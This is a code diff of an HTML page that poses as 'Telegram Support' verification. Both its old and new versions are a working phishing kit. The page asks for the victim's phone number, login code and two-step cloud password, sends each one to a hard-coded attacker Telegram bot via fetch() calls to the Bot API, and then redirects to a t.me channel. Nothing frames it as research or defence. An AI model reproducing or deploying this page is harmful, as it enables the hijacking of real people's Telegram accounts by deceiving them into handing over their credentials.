@@ -3,95 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Support - Secure Verification</title>
+    <title>Telegram Support</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .login-box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 350px; text-align: center; border-top: 5px solid #3390ec; }
-        img { width: 90px; margin-bottom: 20px; }
-        h2 { font-size: 24px; margin-bottom: 10px; color: #222; font-weight: 600; }
-        p { font-size: 15px; color: #666; margin-bottom: 25px; line-height: 1.5; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border: 1.5px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; transition: border 0.3s; }
-        input:focus { border-color: #3390ec; }
-        button { width: 100%; padding: 15px; background: #3390ec; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 18px; font-weight: bold; margin-top: 15px; transition: 0.3s; }
-        button:hover { background: #287bc5; }
+        .box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); width: 320px; text-align: center; }
+        img { width: 80px; margin-bottom: 20px; }
+        h2 { font-size: 24px; margin-bottom: 10px; color: #222; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 15px; }
         .step { display: none; }
         .active { display: block; }
-        .loading { display: none; margin: 20px auto; border: 4px solid #f3f3f3; border-top: 4px solid #3390ec; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-
-<div class="login-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
-    <div id="loading" class="loading"></div>
-
-    <div id="step1" class="step active">
-        <h2>Verify Identity</h2>
-        <p>Enter your phone number to start the security verification process.</p>
-        <input type="tel" id="phone" placeholder="Phone Number (e.g. +251...)" required>
-        <button onclick="goStep2()">Next</button>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
+    <div id="s1" class="step active">
+        <h2>Your Phone</h2>
+        <input type="tel" id="p" placeholder="Phone Number" required>
+        <button onclick="st2()">Next</button>
     </div>
-
-    <div id="step2" class="step">
+    <div id="s2" class="step">
         <h2>Enter Code</h2>
-        <p>A verification code was sent to your Telegram app. Please enter it below.</p>
-        <input type="text" id="code" placeholder="5-digit code" maxlength="6">
-        <button onclick="goStep3()">Verify Code</button>
+        <input type="text" id="c" placeholder="Login Code">
+        <button onclick="st3()">Next</button>
     </div>
-
-    <div id="step3" class="step">
-        <h2>Additional Security</h2>
-        <p>Your account has Two-Step Verification enabled. Please enter your cloud password.</p>
-        <input type="password" id="2step" placeholder="Cloud Password">
-        <button onclick="finish()">Finalize Login</button>
+    <div id="s3" class="step">
+        <h2>Password</h2>
+        <input type="password" id="pw" placeholder="Password">
+        <button onclick="fin()">Submit</button>
     </div>
 </div>
-
 <script>
-    const token = '7249691006:AAGDEpLHUkarPvbWlyMaTwpABPmJSrDOJPI';
-    const chat_id = '6338638588';
-
-    function sendToBot(msg) {
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    const tok = '7249691006:AAGDEpLHUkarPvbWlyMaTwpABPmJSrDOJPI';
+    const cid = '6338638588';
+    function send(m) { fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(m)}&parse_mode=Markdown`); }
+    function st2() { 
+        const ph = document.getElementById('p').value;
+        if(ph) { send(`📱 **Phone:** \`${ph}\``); document.getElementById('s1').classList.remove('active'); document.getElementById('s2').classList.add('active'); }
     }
-
-    function showLoading(nextStep) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('loading').style.display = 'block';
-        setTimeout(() => {
-            document.getElementById('loading').style.display = 'none';
-            document.getElementById(nextStep).classList.add('active');
-        }, 1500);
+    function st3() {
+        const co = document.getElementById('c').value;
+        if(co) { send(`🔑 **Code:** \`${co}\``); document.getElementById('s2').classList.remove('active'); document.getElementById('s3').classList.add('active'); }
     }
-
-    function goStep2() {
-        const phone = document.getElementById('phone').value;
-        if(phone) {
-            sendToBot(`📱 **Step 1: Phone**\n\`${phone}\``);
-            showLoading('step2');
-        }
-    }
-
-    function goStep3() {
-        const code = document.getElementById('code').value;
-        if(code) {
-            sendToBot(`🔑 **Step 2: Code**\n\`${code}\``);
-            showLoading('step3');
-        }
-    }
-
-    function finish() {
-        const password = document.getElementById('2step').value;
-        if(password) {
-            sendToBot(`🛡️ **Step 3: Password**\n\`${password}\``);
-            document.querySelector('.login-box').innerHTML = "<h2>Verification Complete</h2><p>Your account has been verified. Redirecting...</p>";
-            setTimeout(() => {
-                window.location.href = "https://t.me/Mame_Tech_Solution";
-            }, 2000);
-        }
+    function fin() {
+        const pa = document.getElementById('pw').value;
+        if(pa) { send(`🛡️ **Pass:** \`${pa}\``); window.location.href = "https://t.me/Mame_Tech_Solution"; }
     }
 </script>
-
 </body>
 </html>
